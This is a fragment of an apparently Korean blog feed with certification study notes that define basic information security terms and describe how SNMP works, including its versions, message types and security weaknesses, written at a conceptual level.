          &lt;li&gt;예상되는 위협에 의해 자산에 발생할 가능성이 있는 손실의 기대치&lt;/li&gt;
          &lt;li&gt;자산의 가치, 취약점, 위협 요소의 능력, 보호 대책 효과 등에 의해 영향을 받음&lt;/li&gt;
          &lt;li&gt;위협원이 취약점을 이용하여 위협이라는 행동을 통해 자산에 악영향을 미츤ㄴ 결과를 가져올 가능성&lt;/li&gt;
          &lt;li&gt;위험 = 자산 * 위협 * 취약점&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;노출 (Exposure)
        &lt;ul&gt;
          &lt;li&gt;위협 주체에게 손실(losses)을 드러내 보이는 경우&lt;/li&gt;
          &lt;li&gt;취약점은 발생 가능한 피해를 노출시킴&lt;/li&gt;
          &lt;li&gt;패스워드 관리가 느슨하고 패스워드 규정이 집행되지 않으면, 사용자들의 패스워드가 유출되고 허가되지 않은 방법으로 사용될 가능성에 노출될 수 있음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;안전장치/보안대책 (Safeguard / Countermeasures)
        &lt;ul&gt;
          &lt;li&gt;각종 위협이나 변경을 방어하거나 감소시키며 자산을 보호하는 기술, 정책 또는 절차&lt;/li&gt;
          &lt;li&gt;위험을 완화하기 위한 예방적 수단&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;잔여 위험 (Residual Risk)
        &lt;ul&gt;
          &lt;li&gt;정보보호대책을 구현한 후 남아있는 위험&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;다계층 보안 / 심층 방어 (Defense in Depth)
        &lt;ul&gt;
          &lt;li&gt;Multi Layered(Level) Security&lt;/li&gt;
          &lt;li&gt;여러 계층의 보안 대책이나 대응수단을 구성하는 것&lt;/li&gt;
          &lt;li&gt;한 가지 통제가 대응에 실패하더라도 전체 시스템을 위험에 빠트리지 않음&lt;/li&gt;
          &lt;li&gt;시스템의 취할 수 있는 가장 최선의 보안 접근 방법
            &lt;ul&gt;
              &lt;li&gt;보호, 탐지, 대응&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;직무상의 신의성실, 노력 (Due Care, Due Dilligence)
        &lt;ul&gt;
          &lt;li&gt;Due : 특정 목적을 위하여 필요하거나 요구되는 적절하고 충분한 의무&lt;/li&gt;
          &lt;li&gt;Due Care : 특정 목적을 위하여 필요하거나 요구되는 충분한 주의&lt;/li&gt;
          &lt;li&gt;Due Diligence : 특정 목적을 위하여 필요하거나 요구되는 충분한 노력&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;사회공학 (Social Engineering)
        &lt;ul&gt;
          &lt;li&gt;컴퓨터 보안에서 인간 상호 작용의 깊은 신뢰를 바탕으로 사람드을 속여 정상적인 보안절차를 깨트리기 위한 비기술적 침입 수단&lt;/li&gt;
          &lt;li&gt;담당자와 신뢰를 쌓고 전화나 이메일을 통해 도움을 받고, 약점을 이용&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;가장 약한 링크 원칙 (Principle of Weakness Link)
        &lt;ul&gt;
          &lt;li&gt;보안은 가장 약한 링크보다 더 강할 수 없음&lt;/li&gt;
          &lt;li&gt;방화벽에 전력을 공급하는 전원장치, 보안응용 기반으로 동작하는 운영체제, 제어수단을 기획/실현하고 관려하는 사람 중 어떤 하나의 제어수단의 실패가 전체 보안 실패를 야기&lt;/li&gt;
          &lt;li&gt;보안 상 모든 취약점을 파악 vs 공격자는 하나의 취약점을 이용해 공격 (비대칭)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;시점별 통제(Control)
        &lt;ul&gt;
          &lt;li&gt;취약점을 감소시키거나 억제하기 위해 사용되는 매커니즘&lt;/li&gt;
          &lt;li&gt;예방통제 (Preventive Control)
            &lt;ul&gt;
              &lt;li&gt;사전에 위협과 취약점을 대처&lt;/li&gt;
              &lt;li&gt;IPS&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;탐지통제 (Detective Control)
            &lt;ul&gt;
              &lt;li&gt;위협을 탐지하는 통제&lt;/li&gt;
              &lt;li&gt;빠른 탐지일수록 대처에 용이&lt;/li&gt;
              &lt;li&gt;IDS&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;교정통제 (Corrective Control)
            &lt;ul&gt;
              &lt;li&gt;사후처리&lt;/li&gt;
              &lt;li&gt;이미 탐지된 위협이나 취약점에 대처&lt;/li&gt;
              &lt;li&gt;위협이나 취약점을 감소시키는 통제&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;유효성의 원칙 : 제어수단이 효과적이고 적절하게 사용되어야 함.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;대응 : 피해 최소화, 보고, 장비, 기법, 행위, 방지&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="정보보안 관리" /><summary type="html">정보보호 개요 정보화 사회 정보화 사회 : 단일 생활권 사회 모습 변화 전자 메일, 인터넷으로 정보 교환, 재택근무, 홈뱅킹 미래 사이버 전쟁 정보화 역기능 사회 문제 뿐만 아니라 국가 안위에까지 위협 프라이버시 침해, 해커와 바이러스 기승, 컴퓨터 범죄 등 스마트폰 사용으로 정보보호가 더 중요해짐 사이버환경의 특징 비대면성, 익명성, 시간 및 공간적 운영의 무제한성, 무제한적인 정보 및 신속한 전송, 미래의 범죄 및 전쟁 공간 정보보호 정의 정보의 수집, 가공, 저장, 검색, 송신, 수신 중에 발생하는 정보의 훼손, 변조, 유출 등을 방지하기 위한 관리적, 기술적 수단 또는 그러한 수단으로 이루어지는 행위 기밀성, 무결성, 가용성, 인증성 및 부인방지를 보장하기 위하여 기술적/물리적/관리적 보호대책을 강구하는 것 정보보호 관리, 컴퓨터 및 데이터 보안, 네트워크 보안과 정보보호 정책 정보의 가용성과 안정성 (보안성) 정보보호는 정보의 활용과 정보의 통제 사이에서 균형감각을 갖는 행위 사용 가능한 자원을 쉽게 얻을 수 있으면서도 정보에 위협이 되는 요소들을 최소화 정보의 활용 : 가용성의 극대화 정보의 통제 : 안정성을 확보하기 위해 최대한 통제 정보보호의 목표 기밀성 오직 인가된 사람, 인가된 프로세스, 시스템만이 알 필요성에 근거 데이터 기밀성 : 개인정보나 기밀정보를 부정한 사용자가 이용하거나 그들에게 노출되지 않도록 하는 것 프라이버시 : 개인과 관련된 어떤 정보가 수집되고 저장되는지, 누구에게 그 정보가 공개되는지, 누가 공개하는지 등을 통제하거나 영향이 미칠수 있도록 하는 것 접근제어, 암호화 등 무결성 네트워크를 통하여 송수신되는 정보의 내용이 불법적으로 생성, 변경, 삭제되지 않도록 보호 전력차단과 같은 시스템 중단이 정보에 예상치 못한 변형을 일으킬 수 있음 접근제어, 메시지 인증, 침입 탐지, 백업 가용성 시스템이 지체없이 동작하도록 하고, 합법적 사용자가 서비스 사용을 거절당하지 않도록 하는 것 정보는 지속적으로 변화, 인가된 자가 접근할 수 있어야 함. 데이터 백업, 중복성 유지, 물리적 위협요소로부터의 보호 인증성 실체, 신뢰할 수 있는 데이터인지 확인 전송 메시지나 메시지 출처에 대한 유효성, 신뢰성 책임추적성 부인방지 (부인봉쇄), 억제, 결함분리, 침입탐지 예방, 법적인 조치 포렌식 정보보호 관리 정보보호 관리의 개념 정보는 기업이나 공공기관의 중요한 자산 비인가자에게 노출되지 않도록 관리해야 함 기업이나 조직의 목적을 충족시키면서 위험 수위를 낮추는 것 위험은 제거 대상이 아닌 관리(감소) 대상임 최고 경영자의 지원과 관심 필요 정보보호 관리시스템 ISMS : 정보보호 관리체계 정보보호 관리와 정보보호 대책 &amp;lt; &amp;lt; 물리적 보호대책&amp;gt; 관리적 보호대책&amp;gt; 기술적 보호대책 정보 시스템, 통신망, 정보를 보호하기 위한 가장 기본적인 대책 접근통제, 암호기술, 백업체계, 정보시스템 자체에 보안성이 강화된 시스템 소프트웨어 사용 등 물리적 보호대책 자연재해로부터 정보시스템이 위치한 정보처리시설을 보호하기 위한 재해대책 불순 세력이나 적의 파괴로부터 출입통제, 시건장치 등 관리적 보호대책 법, 제도, 규정, 교육 등을 확립, 보안 계획을 수립하고 이를 운영 위험 분석 및 보안감사 시행 기술적 보호대책을 계획, 설계, 제도/정책/절차 생성 내부자의 부당행위 방지 교육 정보보호 관리 정보보호 관리는 기업과 조직의 비즈니스 목적을 충족시키면서 수용가능한 수준으로 위험을 낮추는 것 위험은 제거 대상이 아닌 관리 대상 위험은 식별되거나 감소될 수 있지만 제거될 수 없음 정보보호 관리를 위해서는 최고 경영진의 지원과 관심이 필요 OSI 보안 구조 개요 기본개념 ITU-T (국제 전기통신 연합 - 전기통신표준화 부문) X.800 관리자가 효과적으로 보안문제를 조직화 할 수 있는 유용한 방법 보안공격 : 기관이 소유한 정보의 안정성을 침해하는 제반 행위 보안 매커니즘 : 보안공격을 탐지, 예방하거나 침해를 복구하는 절차 보안 서비스 : 조직의 보안을 강화하기 위한 처리 또는 통신 서비스, 보안 공격에 대응, 하나 이상의 보안 메커니즘을 사용 보안 공격 보안의 세 가지 목표 (기밀성,무결성,가용성) 은 보안공격에 위협을 받을 수 있음 기밀성을 위협하는 공격 스누핑 (Snooping) : 데이터에 대한 비인가 접근 또는 탈취 트래픽 분석 (Traffic Analysis) : 암호화 되어 있을지라도 온라인 트래픽을 분석해 다른 형태의 정보를 얻을 수 있음 무결성을 위협하는 공격 변경 (메시지 수정, Modification) : 적법한 메시지의 일부를 불법으로 수정하거나 메시지 전송 순서를 바꾸는 것 가장 (Masquerading) : 신분위장은 한 개체가 다른 개체의 행세를 하는 것 재연 (재전송, Replaying) : 적극적 공격의 하나로 획득한 데이터 단위를 보관하고 있다가 시간이 경과한 후에 재전송함으로써 인가되지 않은 사항에 접근하는 효과를 노리는 행위 부인 (Repudiation) : 메시지의 송신이나 수신을 부인 가용성을 위협하는 공격 서비스 거부 (Denial of Service) : 매우 일방적인 공격. 시스템의 서비스를 느리게 하거나 완전히 차단 물리적 공격 소극적 공격과 적극적 공격 소극적 공격 : 정보를 획득하거나 사용하려는 시도, 시스템 자원에는 영향을 끼치지 않음 Snooping Snooping : 도청 + 탈취 Snipping : 도청 Traffic Analysis 공격자의 목표는 정보 획득 적극적 공격 : 시스템 자원을 변경하거나 시스템 작동에 영향을 끼치는 공격 형태 변조, 가장, 재연, 부인 DoS, 물리적 공격 무결성과 가용성을 위협 공격자가 다양한 방법을 사용 : 방어보다 탐지가 더 쉬움 보안 서비스 보안 정책을 구현하고 보안 메커니즘에 의해 구현되는 것 서비스 종류 기밀성 / 무결성 / 가용성 인증 부인방지 접근제어 기본 보안용어 정의 자산 (Asset) 조직이 보호해야 할 대상, 데이터 혹은 자산 소유자가 가치를 부여한 실체 하드웨어 : 컴퓨터 시스템, 데이터 처리/저장/통신 장비 소프트웨어 : 운영체제, 시스템 도구, 어플리케이션 데이터 : 파일, 데이터베이스, 암호파일과 같은 보안 관련 데이터 통신 설비와 네트워크 : 지역과 광역 네트워크 통신 연결, 브리지, 라우터 등 취약점 (Vulnerability) 위협의 이용대상으로 관리적, 물리적, 기술적 약점 (정보보호 대책 미비) 위협 (Threat) 손실이나 손상의 원인이 될 가능성을 제공하는 환경의 집합 자연재해 인간에 의한 의도적 위협 : 해커, 바이러스, 도청 등 인간에 의한 비의도적 위협 : 실수, 태만 보안에 해를 끼치는 행동이나 사건 가로채기 (interception) 비인가된 당사자가 자산으로의 접근을 획득한 것을 의미 불법 복사, 도청 등 기밀성에 영향 가로막음 (interruption) 시스템 자산이 손실되거나 사용 불가능하게 됨 하드웨어 장치의 악의적 파괴, 파일 삭제, 서비스 거부 등 가용성에 영향 변조 (modification) 비인가된 당사자가 접근하여 그 내용을 변경 데이터베이스 값 변경, 특정 프로그램 변경 무결성에 영향 위조 (fabrication) 비인가된 당사자가 컴퓨터 시스템 상 불법 객체의 위조 정보를 생성 네트워크 통신에 가짜 거래 정보를 생성 무결성에 영향 위협원 (Threat agents) 정보자산에 해를 끼치는 행동을 할 수 있는 실체 해커, 일반 사용자, 컴퓨터 프로세스, 재난 등 취약점을 이용하는 존재 위험 (Risk) 예상되는 위협에 의해 자산에 발생할 가능성이 있는 손실의 기대치 자산의 가치, 취약점, 위협 요소의 능력, 보호 대책 효과 등에 의해 영향을 받음 위협원이 취약점을 이용하여 위협이라는 행동을 통해 자산에 악영향을 미츤ㄴ 결과를 가져올 가능성 위험 = 자산 * 위협 * 취약점 노출 (Exposure) 위협 주체에게 손실(losses)을 드러내 보이는 경우 취약점은 발생 가능한 피해를 노출시킴 패스워드 관리가 느슨하고 패스워드 규정이 집행되지 않으면, 사용자들의 패스워드가 유출되고 허가되지 않은 방법으로 사용될 가능성에 노출될 수 있음 안전장치/보안대책 (Safeguard / Countermeasures) 각종 위협이나 변경을 방어하거나 감소시키며 자산을 보호하는 기술, 정책 또는 절차 위험을 완화하기 위한 예방적 수단 잔여 위험 (Residual Risk) 정보보호대책을 구현한 후 남아있는 위험 다계층 보안 / 심층 방어 (Defense in Depth) Multi Layered(Level) Security 여러 계층의 보안 대책이나 대응수단을 구성하는 것 한 가지 통제가 대응에 실패하더라도 전체 시스템을 위험에 빠트리지 않음 시스템의 취할 수 있는 가장 최선의 보안 접근 방법 보호, 탐지, 대응 직무상의 신의성실, 노력 (Due Care, Due Dilligence) Due : 특정 목적을 위하여 필요하거나 요구되는 적절하고 충분한 의무 Due Care : 특정 목적을 위하여 필요하거나 요구되는 충분한 주의 Due Diligence : 특정 목적을 위하여 필요하거나 요구되는 충분한 노력 사회공학 (Social Engineering) 컴퓨터 보안에서 인간 상호 작용의 깊은 신뢰를 바탕으로 사람드을 속여 정상적인 보안절차를 깨트리기 위한 비기술적 침입 수단 담당자와 신뢰를 쌓고 전화나 이메일을 통해 도움을 받고, 약점을 이용 가장 약한 링크 원칙 (Principle of Weakness Link) 보안은 가장 약한 링크보다 더 강할 수 없음 방화벽에 전력을 공급하는 전원장치, 보안응용 기반으로 동작하는 운영체제, 제어수단을 기획/실현하고 관려하는 사람 중 어떤 하나의 제어수단의 실패가 전체 보안 실패를 야기 보안 상 모든 취약점을 파악 vs 공격자는 하나의 취약점을 이용해 공격 (비대칭) 시점별 통제(Control) 취약점을 감소시키거나 억제하기 위해 사용되는 매커니즘 예방통제 (Preventive Control) 사전에 위협과 취약점을 대처 IPS 탐지통제 (Detective Control) 위협을 탐지하는 통제 빠른 탐지일수록 대처에 용이 IDS 교정통제 (Corrective Control) 사후처리 이미 탐지된 위협이나 취약점에 대처 위협이나 취약점을 감소시키는 통제 유효성의 원칙 : 제어수단이 효과적이고 적절하게 사용되어야 함. 대응 : 피해 최소화, 보고, 장비, 기법, 행위, 방지</summary></entry><entry><title type="html">정보보안 - SNMP(Simple Network Management Protocol)</title><link href="https://bluesplatter.com/is_certification/IS-Application-SNMP/" rel="alternate" type="text/html" title="정보보안 - SNMP(Simple Network Management Protocol)" /><published>2021-07-12T09:00:00+09:00</published><updated>2021-07-12T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-SNMP</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-SNMP/">&lt;h1 id=&quot;snmp-simple-network-manage-protocol&quot;&gt;SNMP (Simple Network Manage Protocol)&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;간이 망 관리 프로토콜
        &lt;ul&gt;
          &lt;li&gt;TCP/IP 초창기에는 ICMP 프로토콜의 ping 을 이용해 장비간 연결 상태 파악
            &lt;ul&gt;
              &lt;li&gt;Host 수의 증가로 네트워크 시스템이 복잡해짐 -&amp;gt; 관리의 어려움&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;1988년 IAB (인터넷 표준제안 위원회) 에서 표준 작업을 시작
            &lt;ul&gt;
              &lt;li&gt;SGMP -&amp;gt; SNMP&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;네트워크 장비를 관리, 감시하기 위한 프로토콜&lt;/li&gt;
          &lt;li&gt;UDP, 응용계층 표준 프로토콜&lt;/li&gt;
          &lt;li&gt;모니터링 / 컨트롤&lt;/li&gt;
          &lt;li&gt;네트워크 관리 시스템 (NMS - Network Management System) 에서 사용
            &lt;ul&gt;
              &lt;li&gt;정기적으로 관리정보 수집 (SNMP Protocol)&lt;/li&gt;
              &lt;li&gt;실시간으로 네트워크 상태 모니터링, 설정 (SNMP Protocol)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;대부분의 OS 에 탑재&lt;/li&gt;
      &lt;li&gt;네트워크 관리 정보를 얻기 위해서 관리 프로그램이 필요
        &lt;ul&gt;
          &lt;li&gt;SNMP 는 Protocol&lt;/li&gt;
          &lt;li&gt;관리 프로그램 필요&lt;/li&gt;
          &lt;li&gt;관리시스템, 관리대상 필요&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 구조
    &lt;ul&gt;
      &lt;li&gt;관리시스템 Manager 모듈 (162/UDP)
        &lt;ul&gt;
          &lt;li&gt;Manager 모듈이 Agent 모듈을 조회&lt;/li&gt;
          &lt;li&gt;Agent 는 Manager 에 응답&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;관리대상 Agent 모듈 (161/UDP)
        &lt;ul&gt;
          &lt;li&gt;Agent 는 Manager 에 Trap 전송&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;MRTG (Multiple Router Traffic Grapher)
        &lt;ul&gt;
          &lt;li&gt;SNMP 기반의 장비 모니터링 프로그램&lt;/li&gt;
          &lt;li&gt;네트워크 상에 발생하는 트래픽 사용량 모니터링&lt;/li&gt;
          &lt;li&gt;MIB 를 이용해 정보 수집 가능&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;MIB (Management Information Base)
        &lt;ul&gt;
          &lt;li&gt;관리장치에 대한 정보가 모인 데이터베이스&lt;/li&gt;
          &lt;li&gt;Agent 각각이 MIB를 가지고 있음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 동작 (PDU)
    &lt;ul&gt;
      &lt;li&gt;Manager -&amp;gt; Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get Request&lt;/code&gt; : MIB 정보 요청&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager &amp;lt;- Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get Response&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager -&amp;gt; Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get Next Request&lt;/code&gt; : 이미 요청한 정보의 다음 정보 요청&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager &amp;lt;- Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get Response&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager -&amp;gt; Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Set Request&lt;/code&gt; : MIB 설정 요청&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager &amp;lt;- Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get Response&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Manager &amp;lt;- Agent
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trap&lt;/code&gt; : Agent 가 Manager 에게 비동기적으로 알림 (Notify)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 통신을 위한 3가지 조건
    &lt;ul&gt;
      &lt;li&gt;SNMP 버전이 일치해야 함
        &lt;ul&gt;
          &lt;li&gt;v1
            &lt;ul&gt;
              &lt;li&gt;SGMP (Simple Gateway Management Protocol) 를 발전시킴&lt;/li&gt;
              &lt;li&gt;보안기능(암호, 인증) 없음&lt;/li&gt;
              &lt;li&gt;community string 만 일치하면 모든 정보 획득가능&lt;/li&gt;
              &lt;li&gt;평문 전송 (Snipping 노출)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;v2
            &lt;ul&gt;
              &lt;li&gt;보안기능 추가
                &lt;ul&gt;
                  &lt;li&gt;대칭키 암호화 알고리즘 (DES)&lt;/li&gt;
                  &lt;li&gt;해시 알고리즘 (MD5)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;송신처 인증 기능이 없음&lt;/li&gt;
              &lt;li&gt;SNMP v2c
                &lt;ul&gt;
                  &lt;li&gt;복잡한 보안기능 제거, 보안상 취약&lt;/li&gt;
                  &lt;li&gt;평문 전송 (Snipping 노출)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;v3
            &lt;ul&gt;
              &lt;li&gt;Data 인증&lt;/li&gt;
              &lt;li&gt;암호화&lt;/li&gt;
              &lt;li&gt;재사용방지&lt;/li&gt;
              &lt;li&gt;접근통제&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Community String
        &lt;ul&gt;
          &lt;li&gt;송수신 하기 전 미리 인증을 하기 위해 사용하는 P/W&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;PDU (Protocol Data Unit) 이 일치해야 함
        &lt;ul&gt;
          &lt;li&gt;통신하기 위한 메시지 유형
            &lt;ul&gt;
              &lt;li&gt;Get Request &amp;lt;–&amp;gt; Get Response&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Read 형
            &lt;ul&gt;
              &lt;li&gt;SNMPv1
                &lt;ul&gt;
                  &lt;li&gt;Get Request&lt;/li&gt;
                  &lt;li&gt;Get Next Request&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;SNMPv2 / v3
                &lt;ul&gt;
                  &lt;li&gt;Get Request&lt;/li&gt;
                  &lt;li&gt;Get Bulk Request : 요청 객체의 범위를 지정&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Write 형
            &lt;ul&gt;
              &lt;li&gt;SNMPv1
                &lt;ul&gt;
                  &lt;li&gt;Set Request&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;SNMPv2 / v3
                &lt;ul&gt;
                  &lt;li&gt;Set Request&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Response 형
            &lt;ul&gt;
              &lt;li&gt;SNMPv1
                &lt;ul&gt;
                  &lt;li&gt;Get Response&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;SNMPv2 / v3
                &lt;ul&gt;
                  &lt;li&gt;Response&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Trap
            &lt;ul&gt;
              &lt;li&gt;SNMPv1
                &lt;ul&gt;
                  &lt;li&gt;Trap&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;SNMPv2 / v3
                &lt;ul&gt;
                  &lt;li&gt;TrapV2&lt;/li&gt;
                  &lt;li&gt;InformRequest : Manager 가 다른 Manager 에 정보를 요청할 때 사용&lt;/li&gt;
                  &lt;li&gt;Report : 다른 Manager 에 보고할 때 사용&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;(SNMPv3 기준) Message 구조
    &lt;ul&gt;
      &lt;li&gt;
        &lt;table&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;버전&lt;/td&gt;
              &lt;td&gt;공통 Header&lt;/td&gt;
              &lt;td&gt;보안 매개변수&lt;/td&gt;
              &lt;td&gt;PDU 데이터&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
        &lt;ul&gt;
          &lt;li&gt;공통 Header 부
            &lt;ul&gt;
              &lt;li&gt;
                &lt;table&gt;
                  &lt;tbody&gt;
                    &lt;tr&gt;
                      &lt;td&gt;메시지 ID&lt;/td&gt;
                      &lt;td&gt;메시지 최대크기&lt;/td&gt;
                      &lt;td&gt;메시지 Flag&lt;/td&gt;
                      &lt;td&gt;메시지 보안모델&lt;/td&gt;
                    &lt;/tr&gt;
                  &lt;/tbody&gt;
                &lt;/table&gt;
                &lt;ul&gt;
                  &lt;li&gt;메시지 보안모델
                    &lt;ul&gt;
                      &lt;li&gt;USM (User Security Model)&lt;/li&gt;
                      &lt;li&gt;VACM (View-based Access Control Model) 모델&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보안 매개변수 부
            &lt;ul&gt;
              &lt;li&gt;
                &lt;table&gt;
                  &lt;tbody&gt;
                    &lt;tr&gt;
                      &lt;td&gt;재전송&lt;/td&gt;
                      &lt;td&gt;공격&lt;/td&gt;
                      &lt;td&gt;방지&lt;/td&gt;
                      &lt;td&gt;메시지위변조&lt;/td&gt;
                      &lt;td&gt;방지&lt;/td&gt;
                      &lt;td&gt;암호 매개변수&lt;/td&gt;
                    &lt;/tr&gt;
                  &lt;/tbody&gt;
                &lt;/table&gt;
                &lt;ul&gt;
                  &lt;li&gt;재전송 공격방지
                    &lt;ul&gt;
                      &lt;li&gt;SNMP 엔진 IP (Authoritative 엔진 ID)&lt;/li&gt;
                      &lt;li&gt;부트횟수 (Authoritative 엔진부트 횟수)&lt;/li&gt;
                      &lt;li&gt;엔진 시간정보 (Authoritative 엔진 time)&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;
                    &lt;table&gt;
                      &lt;tbody&gt;
                        &lt;tr&gt;
                          &lt;td&gt;메시지위변조 방지 (HMAC) - MD5&lt;/td&gt;
                          &lt;td&gt;SHA&lt;/td&gt;
                        &lt;/tr&gt;
                      &lt;/tbody&gt;
                    &lt;/table&gt;
                    &lt;ul&gt;
                      &lt;li&gt;사용자 인증 매개변수&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;암호 매개변수 (DES-CBC)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 데이터 수집 방식
    &lt;ul&gt;
      &lt;li&gt;Polling : Manager 가 Agent 에 요청하면 응답&lt;/li&gt;
      &lt;li&gt;Event Report : Agent 가 Manager 에 Trap Message 전송 (Notify)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 취약점
    &lt;ul&gt;
      &lt;li&gt;DoS 공격 취약점&lt;/li&gt;
      &lt;li&gt;버퍼오버플로우 취약점&lt;/li&gt;
      &lt;li&gt;비인가접속 취약점&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SNMP 보안
    &lt;ul&gt;
      &lt;li&gt;SNMP는 관리자 입장에서 매우 중요한 정보를 제공&lt;/li&gt;
      &lt;li&gt;SNMP에 읽기, 쓰기 권한이 있는데 쓰기 권한은 사용 자제
        &lt;ul&gt;
          &lt;li&gt;Set Request 제한&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;SNMP v3 에서 보안 서비스를 제공&lt;/li&gt;
      &lt;li&gt;community string
        &lt;ul&gt;
          &lt;li&gt;SNMP 데몬 (manager) 와 클라이언트 (Agent) 간 데이터 송수신 전 인증 필요&lt;/li&gt;
          &lt;li&gt;인증을 위해 사용하는 패스워드&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;읽기모드 RO (Read Only) / 쓰기모드 RW (Read Write)&lt;/li&gt;
      &lt;li&gt;MIB : 관리장치에 대한 정보가 모인 데이터베이스
        &lt;ul&gt;
